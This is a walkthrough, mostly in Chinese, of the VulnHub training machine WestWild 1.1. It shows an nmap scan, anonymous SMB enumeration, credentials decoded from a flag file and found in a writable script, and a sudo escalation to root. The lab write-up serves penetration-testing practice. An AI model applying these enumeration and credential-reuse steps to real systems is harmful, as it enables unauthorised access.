# WestWild: 1.1

2024-6-13 https://www.vulnhub.com/entry/westwild-11,338/

difficulty: intermediate

## IP

192.168.5.38

## Scan

Open Port -> 22,80,139,445

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 6fee95919c62b214cd630a3ef8109eda (DSA)
|   2048 104594fea72f028a9b211a31c5033048 (RSA)
|   256 9794178618e28e7a738e412076ba5173 (ECDSA)
|_  256 2381c776bb3778ee3b73e255ad813272 (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

先看 smb 是否有映射信息，smbclient -L //192.168.5.38/ :

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
wave            Disk      WaveDoor
IPC$            IPC       IPC Service (WestWild server (Samba, Ubuntu))

Reconnecting with SMB1 for workgroup listing.
```

查看 wave:

```
smbclient  //192.168.5.38/wave/ -U anonymous -N

FLAG1.txt                           N       93  Tue Jul 30 10:31:05 2019
message_from_aveng.txt              N      115  Tue Jul 30 13:21:48 2019
```

发现第一个 flag:

```
cat FLAG1.txt
RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K

进行base64解码：
Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
user:wavex
password:door+open
```

```
cat message_from_aveng.txt
Dear Wave ,
Am Sorry but i was lost my password ,
and i believe that you can reset  it for me .
Thank You
Aveng
```

发现两个用户名 wave 和 aveng

直接 ssh 登陆，登陆成功。

查看 .viminfo 看看历史操作记录,没发现重点信息。

试着查找下此用户的可写文件：

```
find / -writable -type f 2>/dev/null | grep -v '/sys' | grep -v '/proc'

/usr/share/av/westsidesecret/ififoregt.sh

cat /usr/share/av/westsidesecret/ififoregt.sh

figlet "if i foregt so this my way"
echo "user:aveng"
echo "password:kaizen+80"
```

尝试 su aveng 切换用户，sudo -l 显示所有 ALL，可以直接提权到 root：

```
aveng@WestWild:~$ sudo -l
Matching Defaults entries for aveng on WestWild:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aveng may run the following commands on WestWild:
    (ALL : ALL) ALL
aveng@WestWild:~$ sudo su
root@WestWild:/home/aveng# cd /root
root@WestWild:~# ls
FLAG2.txt
root@WestWild:~# cat FLAG2.txt
Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}

Great! take a screenshot and Share it with me in twitter @HashimAlshareff

```
